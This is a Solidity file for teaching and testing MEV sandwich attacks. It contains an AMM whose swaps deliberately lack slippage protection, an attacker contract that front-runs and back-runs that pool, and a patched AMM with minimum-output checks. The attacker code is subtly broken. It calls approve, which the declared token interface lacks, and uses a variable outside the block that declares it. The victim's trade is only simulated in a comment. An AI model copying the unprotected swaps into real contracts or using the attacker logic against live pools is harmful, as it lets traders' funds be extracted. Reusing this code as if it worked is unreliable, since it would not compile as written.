// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title MEV Sandwich Attack Vulnerable Contract
 * @notice DELIBERATELY VULNERABLE - For testing purposes only
 *
 * Vulnerability: Susceptible to MEV sandwich attacks
 * Impact: Users lose value to front-running bots
 * Attack: Front-run → victim's trade → back-run
 *
 * Real-world impact:
 * - $1B+ extracted from DeFi users annually
 * - Common on Uniswap V2 and similar AMMs
 * - Affects all traders without slippage protection
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title Simple AMM Vulnerable to MEV
 * @notice Basic x*y=k AMM without MEV protection
 */
contract VulnerableAMM {
    IERC20 public tokenA;
    IERC20 public tokenB;

    uint256 public reserveA;
    uint256 public reserveB;

    uint256 public constant FEE_PERCENT = 3; // 0.3% fee
    uint256 public constant FEE_DENOMINATOR = 1000;

    event Swap(
        address indexed user,
        uint256 amountIn,
        uint256 amountOut,
        bool aToB
    );
    event LiquidityAdded(address indexed provider, uint256 amountA, uint256 amountB);

    constructor(address _tokenA, address _tokenB) {
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }

    /**
     * @notice Add liquidity to the pool
     */
    function addLiquidity(uint256 amountA, uint256 amountB) external {
        tokenA.transferFrom(msg.sender, address(this), amountA);
        tokenB.transferFrom(msg.sender, address(this), amountB);

        reserveA += amountA;
        reserveB += amountB;

        emit LiquidityAdded(msg.sender, amountA, amountB);
    }

    /**
     * @notice Swap tokenA for tokenB
     * @dev VULNERABLE: No slippage protection, no minimum output
     * @param amountIn Amount of tokenA to swap
     */
    function swapAForB(uint256 amountIn) external returns (uint256) {
        require(amountIn > 0, "Invalid amount");
        require(reserveA > 0 && reserveB > 0, "No liquidity");

        // Calculate output with fee (x*y=k formula)
        uint256 amountInWithFee = amountIn * (FEE_DENOMINATOR - FEE_PERCENT);
        uint256 numerator = amountInWithFee * reserveB;
        uint256 denominator = (reserveA * FEE_DENOMINATOR) + amountInWithFee;
        uint256 amountOut = numerator / denominator;

        require(amountOut > 0, "Insufficient output");
        require(amountOut < reserveB, "Insufficient liquidity");

        // VULNERABILITY: No slippage check, accepts any output amount
        // This allows MEV bots to sandwich the transaction

        tokenA.transferFrom(msg.sender, address(this), amountIn);
        tokenB.transfer(msg.sender, amountOut);

        reserveA += amountIn;
        reserveB -= amountOut;

        emit Swap(msg.sender, amountIn, amountOut, true);

        return amountOut;
    }

    /**
     * @notice Swap tokenB for tokenA
     * @dev VULNERABLE: No slippage protection
     */
    function swapBForA(uint256 amountIn) external returns (uint256) {
        require(amountIn > 0, "Invalid amount");
        require(reserveA > 0 && reserveB > 0, "No liquidity");

        uint256 amountInWithFee = amountIn * (FEE_DENOMINATOR - FEE_PERCENT);
        uint256 numerator = amountInWithFee * reserveA;
        uint256 denominator = (reserveB * FEE_DENOMINATOR) + amountInWithFee;
        uint256 amountOut = numerator / denominator;

        require(amountOut > 0, "Insufficient output");
        require(amountOut < reserveA, "Insufficient liquidity");

        tokenB.transferFrom(msg.sender, address(this), amountIn);
        tokenA.transfer(msg.sender, amountOut);

        reserveA -= amountOut;
        reserveB += amountIn;

        emit Swap(msg.sender, amountIn, amountOut, false);

        return amountOut;
    }

    /**
     * @notice Get current price of A in terms of B
     */
    function getPrice() external view returns (uint256) {
        if (reserveA == 0) return 0;
        return (reserveB * 1e18) / reserveA;
    }

    /**
     * @notice Calculate output amount for given input
     */
    function getAmountOut(uint256 amountIn, bool aToB) external view returns (uint256) {
        if (aToB) {
            uint256 amountInWithFee = amountIn * (FEE_DENOMINATOR - FEE_PERCENT);
            return (amountInWithFee * reserveB) / ((reserveA * FEE_DENOMINATOR) + amountInWithFee);
        } else {
            uint256 amountInWithFee = amountIn * (FEE_DENOMINATOR - FEE_PERCENT);
            return (amountInWithFee * reserveA) / ((reserveB * FEE_DENOMINATOR) + amountInWithFee);
        }
    }
}

/**
 * @title MEV Sandwich Attacker
 * @notice Performs sandwich attacks on vulnerable trades
 *
 * Attack Flow:
 * 1. Monitor mempool for large trades
 * 2. Front-run: Submit transaction with higher gas price before victim
 * 3. Victim's trade executes at worse price
 * 4. Back-run: Submit transaction right after to sell and profit
 */
contract MEVSandwichAttacker {
    VulnerableAMM public amm;
    IERC20 public tokenA;
    IERC20 public tokenB;

    event SandwichAttack(
        uint256 frontRunProfit,
        uint256 backRunProfit,
        uint256 totalProfit
    );

    constructor(address _amm, address _tokenA, address _tokenB) {
        amm = VulnerableAMM(_amm);
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }

    /**
     * @notice Execute sandwich attack
     * @param victimAmountIn The victim's trade size we're sandwiching
     * @param frontRunAmount Our front-run trade size
     */
    function sandwich(
        uint256 victimAmountIn,
        uint256 frontRunAmount,
        bool victimSwapsAToB
    ) external {
        uint256 initialBalanceA = tokenA.balanceOf(address(this));
        uint256 initialBalanceB = tokenB.balanceOf(address(this));

        if (victimSwapsAToB) {
            // Victim swaps A for B

            // Step 1: Front-run - Buy B with A (same direction as victim)
            tokenA.approve(address(amm), frontRunAmount);
            uint256 frontRunOutput = amm.swapAForB(frontRunAmount);

            // Step 2: Victim's transaction executes (simulated)
            // Price of B increases, victim gets less B for their A

            // Step 3: Back-run - Sell B back for A (opposite direction)
            tokenB.approve(address(amm), frontRunOutput);
            amm.swapBForA(frontRunOutput);
        } else {
            // Victim swaps B for A

            // Front-run in same direction
            tokenB.approve(address(amm), frontRunAmount);
            uint256 frontRunOutput = amm.swapBForA(frontRunAmount);

            // Victim's trade executes (simulated)

            // Back-run in opposite direction
            tokenA.approve(address(amm), frontRunOutput);
            amm.swapAForB(frontRunOutput);
        }

        // Calculate profit
        uint256 finalBalanceA = tokenA.balanceOf(address(this));
        uint256 finalBalanceB = tokenB.balanceOf(address(this));

        uint256 profitA = finalBalanceA > initialBalanceA ? finalBalanceA - initialBalanceA : 0;
        uint256 profitB = finalBalanceB > initialBalanceB ? finalBalanceB - initialBalanceB : 0;

        emit SandwichAttack(frontRunAmount, frontRunOutput, profitA + profitB);
    }

    /**
     * @notice Simulate the profitability of a sandwich attack
     * @return estimatedProfit Estimated profit in tokenA
     */
    function estimateSandwichProfit(
        uint256 victimAmountIn,
        uint256 frontRunAmount,
        bool victimSwapsAToB
    ) external view returns (uint256 estimatedProfit) {
        // Simplified estimation
        // In reality, would simulate the full sequence
        if (victimSwapsAToB) {
            // Price impact of our front-run + victim's trade
            uint256 priceImpact = (frontRunAmount + victimAmountIn) * 100 / amm.reserveA();
            estimatedProfit = (frontRunAmount * priceImpact) / 100;
        } else {
            uint256 priceImpact = (frontRunAmount + victimAmountIn) * 100 / amm.reserveB();
            estimatedProfit = (frontRunAmount * priceImpact) / 100;
        }
    }
}

/**
 * @title Secure AMM with Slippage Protection
 * @notice Protected against MEV sandwich attacks
 */
contract SecureAMM {
    IERC20 public tokenA;
    IERC20 public tokenB;

    uint256 public reserveA;
    uint256 public reserveB;

    uint256 public constant FEE_PERCENT = 3;
    uint256 public constant FEE_DENOMINATOR = 1000;

    event Swap(
        address indexed user,
        uint256 amountIn,
        uint256 amountOut,
        uint256 minAmountOut,
        bool aToB
    );

    constructor(address _tokenA, address _tokenB) {
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
    }

    /**
     * @notice Swap tokenA for tokenB with slippage protection
     * @param amountIn Amount of tokenA to swap
     * @param minAmountOut Minimum acceptable amount of tokenB
     * @dev FIXED: User specifies minimum output amount
     */
    function swapAForB(
        uint256 amountIn,
        uint256 minAmountOut
    ) external returns (uint256) {
        require(amountIn > 0, "Invalid amount");
        require(reserveA > 0 && reserveB > 0, "No liquidity");

        // Calculate output
        uint256 amountInWithFee = amountIn * (FEE_DENOMINATOR - FEE_PERCENT);
        uint256 numerator = amountInWithFee * reserveB;
        uint256 denominator = (reserveA * FEE_DENOMINATOR) + amountInWithFee;
        uint256 amountOut = numerator / denominator;

        // FIXED: Slippage protection
        require(amountOut >= minAmountOut, "Insufficient output amount");

        tokenA.transferFrom(msg.sender, address(this), amountIn);
        tokenB.transfer(msg.sender, amountOut);

        reserveA += amountIn;
        reserveB -= amountOut;

        emit Swap(msg.sender, amountIn, amountOut, minAmountOut, true);

        return amountOut;
    }

    /**
     * @notice Swap tokenB for tokenA with slippage protection
     * @param amountIn Amount of tokenB to swap
     * @param minAmountOut Minimum acceptable amount of tokenA
     * @dev FIXED: User specifies minimum output amount
     */
    function swapBForA(
        uint256 amountIn,
        uint256 minAmountOut
    ) external returns (uint256) {
        require(amountIn > 0, "Invalid amount");
        require(reserveA > 0 && reserveB > 0, "No liquidity");

        uint256 amountInWithFee = amountIn * (FEE_DENOMINATOR - FEE_PERCENT);
        uint256 numerator = amountInWithFee * reserveA;
        uint256 denominator = (reserveB * FEE_DENOMINATOR) + amountInWithFee;
        uint256 amountOut = numerator / denominator;

        // FIXED: Slippage protection
        require(amountOut >= minAmountOut, "Insufficient output amount");

        tokenB.transferFrom(msg.sender, address(this), amountIn);
        tokenA.transfer(msg.sender, amountOut);

        reserveA -= amountOut;
        reserveB += amountIn;

        emit Swap(msg.sender, amountIn, amountOut, minAmountOut, false);

        return amountOut;
    }

    /**
     * @notice Get quote for swap with slippage
     * @param amountIn Input amount
     * @param maxSlippageBps Maximum slippage in basis points (e.g., 50 = 0.5%)
     * @return amountOut Expected output amount
     * @return minAmountOut Minimum output with slippage
     */
    function getQuoteWithSlippage(
        uint256 amountIn,
        uint256 maxSlippageBps,
        bool aToB
    ) external view returns (uint256 amountOut, uint256 minAmountOut) {
        if (aToB) {
            uint256 amountInWithFee = amountIn * (FEE_DENOMINATOR - FEE_PERCENT);
            amountOut = (amountInWithFee * reserveB) / ((reserveA * FEE_DENOMINATOR) + amountInWithFee);
        } else {
            uint256 amountInWithFee = amountIn * (FEE_DENOMINATOR - FEE_PERCENT);
            amountOut = (amountInWithFee * reserveA) / ((reserveB * FEE_DENOMINATOR) + amountInWithFee);
        }

        // Calculate minimum with slippage
        minAmountOut = amountOut - ((amountOut * maxSlippageBps) / 10000);
    }
}
